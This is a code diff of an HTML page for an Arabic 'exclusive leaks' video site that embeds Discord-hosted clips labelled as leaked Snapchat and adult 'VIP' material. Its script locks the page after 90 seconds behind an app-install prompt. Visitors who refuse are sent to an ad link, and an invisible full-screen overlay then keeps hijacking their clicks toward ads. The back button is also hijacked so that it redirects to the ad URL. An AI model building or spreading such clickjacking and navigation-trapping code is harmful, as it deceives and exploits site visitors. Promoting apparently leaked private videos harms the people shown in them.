@@ -12,85 +12,19 @@
     <meta content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgxTd6VTp-gabKWvZoKBdDQNnK1hLoFuQ1f8yUGgKJicI7ol5OOuZgKjNY00KSX_U8Z_S7f3BpR4Y78Mmx8IVyHRinmyg_11r495BaQY4bFzF9pNQAxL5_5aBuCMW4lyrtTuMfCOeNpvKzAqCwIY66hmbSPzYoUyjLbHC78MI1EHmOSHjVfgu8XtdMGfDls/s1149/1000204054.jpg" name="twitter:image"></meta>
 
     <style>
-        body {
-            background-color: #000;
-            color: #fff;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0;
-            padding: 0;
-            text-align: center;
-            overflow-x: hidden;
-        }
-
-        /* الستارة الشفافة (Adsterra) */
-        #invisible-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: transparent;
-            z-index: 9999;
-            cursor: pointer;
-            display: none; /* مخفية في البداية */
-        }
-
-        /* قفل السيرفر (SnapCash) */
-        #app-lock-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.96);
-            z-index: 10001;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            backdrop-filter: blur(15px);
-        }
-
-        .lock-card {
-            background: #111;
-            padding: 25px;
-            border-radius: 20px;
-            border: 1px solid #333;
-            max-width: 85%;
-            box-shadow: 0 0 40px rgba(255, 0, 0, 0.3);
-        }
-
-        .main-container {
-            max-width: 650px;
-            margin: auto;
-            padding: 10px;
-        }
-
+        body { background-color: #000; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; text-align: center; overflow-x: hidden; }
+        #invisible-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: transparent; z-index: 9999; cursor: pointer; display: none; }
+        #app-lock-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.96); z-index: 10001; display: none; align-items: center; justify-content: center; backdrop-filter: blur(15px); }
+        .lock-card { background: #111; padding: 25px; border-radius: 20px; border: 1px solid #333; max-width: 85%; box-shadow: 0 0 40px rgba(255, 0, 0, 0.3); }
+        .main-container { max-width: 650px; margin: auto; padding: 10px; }
         header { padding: 15px; border-bottom: 1px solid #222; margin-bottom: 15px; }
         .logo { font-size: 1.8rem; font-weight: 900; color: #ff0000; text-shadow: 0 0 10px rgba(255, 0, 0, 0.5); }
         .video-card { background: #111; border-radius: 12px; overflow: hidden; border: 1px solid #333; margin-bottom: 25px; }
-        .video-title { padding: 10px; font-size: 0.9rem; color: #ffcc00; text-align: right; background: #161616; }
+        .video-title { padding: 10px; font-size: 0.9rem; color: #ffcc00; text-align: right; background: #161616; border-bottom: 1px solid #222; }
         .hero-video { aspect-ratio: 16 / 9; display: flex; align-items: center; justify-content: center; background: #000; }
-        video { width: 100%; height: 100%; }
-
-        .btn-install {
-            background: #00E676;
-            color: #000;
-            text-decoration: none;
-            padding: 18px;
-            display: block;
-            border-radius: 50px;
-            font-weight: 900;
-            font-size: 1.3rem;
-            margin-top: 20px;
-            animation: pulse 1.5s infinite;
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            70% { transform: scale(1.03); }
-            100% { transform: scale(1); }
-        }
-
+        video { width: 100%; height: 100%; object-fit: contain; }
+        .btn-install { background: #00E676; color: #000; text-decoration: none; padding: 18px; display: block; border-radius: 50px; font-weight: 900; font-size: 1.3rem; margin-top: 20px; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 70% { transform: scale(1.03); } 100% { transform: scale(1); } }
         .refuse-link { color: #555; font-size: 0.8rem; text-decoration: underline; margin-top: 15px; display: block; cursor: pointer; }
     </style>
 </head>
@@ -115,10 +49,7 @@
     </div>
 </div>
 
-<header>
-    <h1 class="logo">حصريات العرب</h1>
-    <div style="color: #888; font-size: 0.8rem;">سيرفرات المشاهدة المباشرة (VIP)</div>
-</header>
+<header><h1 class="logo">حصريات العرب</h1><div style="color: #888; font-size: 0.8rem;">سيرفرات المشاهدة المباشرة (VIP)</div></header>
 
 <div class="main-container">
     <div class="video-card">
@@ -129,43 +60,72 @@
             </video>
         </div>
     </div>
-    <div class="video-card"><div class="video-title">📸 لقطات السناب</div><div class="hero-video"><video controls playsinline><source src="https://media.discordapp.net/attachments/1134630020162269298/1472885222449090610/VID_20260216_111847.mp4?ex=699432c1&is=6992e141&hm=40a2ed506894beadf526d4f6a429beba7f8e387f4922807605aa9b74574d849e&" type="video/mp4"></video></div></div>
+
+    <div class="video-card">
+        <div class="video-title">📸 لقطات السناب: الأجزاء المسربة</div>
+        <div class="hero-video">
+            <video controls playsinline>
+                <source src="https://media.discordapp.net/attachments/1134630020162269298/1472885222449090610/VID_20260216_111847.mp4?ex=699432c1&is=6992e141&hm=40a2ed506894beadf526d4f6a429beba7f8e387f4922807605aa9b74574d849e&" type="video/mp4">
+            </video>
+        </div>
+    </div>
+
+    <div class="video-card">
+        <div class="video-title">🎥 تسريب الأرشيف: الجزء الثالث</div>
+        <div class="hero-video">
+            <video controls playsinline>
+                <source src="https://media.discordapp.net/attachments/1134630279034720356/1472886067396083813/VID_20260216_112311.mp4?ex=6994338b&is=6992e20b&hm=b2a0cf7a1a4262d3b81b06c7b813d23d1c48d3b60ead6e455a047635523e8661&" type="video/mp4">
+            </video>
+        </div>
+    </div>
+
+    <div class="video-card">
+        <div class="video-title">🔞 خاص VIP: مقاطع السيرفر السري</div>
+        <div class="hero-video">
+            <video controls playsinline>
+                <source src="https://media.discordapp.net/attachments/1134630279034720356/1472886226938888243/VID_20260216_112348.mp4?ex=699433b1&is=6992e231&hm=cdfe278624b14a7c82d589be3b5952223b242cb004c7c77eb864e2319052809d&" type="video/mp4">
+            </video>
+        </div>
+    </div>
+
+    <div class="video-card">
+        <div class="video-title">📂 ختام الملف: المشاهد النادرة</div>
+        <div class="hero-video">
+            <video controls playsinline>
+                <source src="https://media.discordapp.net/attachments/1134630279034720356/1472886235159597078/VID_20260216_112356.mp4?ex=699433b3&is=6992e233&hm=4b674d13a6277c44a936f98f6f231ca50f825ebab4fe8e64c18b4d230c5fcd4b&" type="video/mp4">
+            </video>
+        </div>
+    </div>
 </div>
 
 <script>
     const adsLink = "https://www.effectivegatecpm.com/am4whsry06?key=cbec04a8dfceb0dd47c7df9691777cb5";
-    const snapLink = "https://vidspaceapp.onelink.me/RzWN/56gc1p3b?deep_link_value=..."; // رابطك الكامل هنا
     const overlay = document.getElementById('invisible-overlay');
     const lock = document.getElementById('app-lock-overlay');
     let refusalMode = false;
 
-    // 1. تفعيل قفل السناب كاش بعد 90 ثانية
     setTimeout(() => {
         lock.style.display = 'flex';
         document.querySelectorAll('video').forEach(v => v.pause());
     }, 90000);
 
-    // 2. التعامل مع الرفض (إرسال لـ Adsterra ثم تفعيل النهج القديم المستفز)
     function handleRefusal() {
         window.open(adsLink, '_blank');
         lock.style.display = 'none';
         refusalMode = true;
-        activateAggressiveAds(); // تفعيل الستارة المستفزة
+        activateAggressiveAds();
     }
 
-    // 3. نظام الستارة المستفزة (كل 3-6 ثوان تظهر لمدة 8-12 ثانية)
     function activateAggressiveAds() {
         function showCycle() {
             if(!refusalMode) return;
             const waitTime = Math.floor(Math.random() * (6000 - 3000 + 1)) + 3000;
             const openDuration = Math.floor(Math.random() * (12000 - 8000 + 1)) + 8000;
-
             setTimeout(() => {
                 overlay.style.display = 'block';
-                console.log("Adsterra Active");
                 setTimeout(() => {
                     overlay.style.display = 'none';
-                    showCycle(); // تكرار الدورة
+                    showCycle();
                 }, openDuration);
             }, waitTime);
         }
@@ -177,12 +137,9 @@
         overlay.style.display = 'none';
     }
 
-    // 4. مانع الخروج الذكي (يحول لـ Adsterra ثم يرجع للموقع)
     (function() {
         window.history.pushState({page: 1}, "", window.location.href);
-        window.onpopstate = function() {
-            window.location.replace(adsLink);
-        };
+        window.onpopstate = function() { window.location.replace(adsLink); };
     })();
 </script>
 </body>
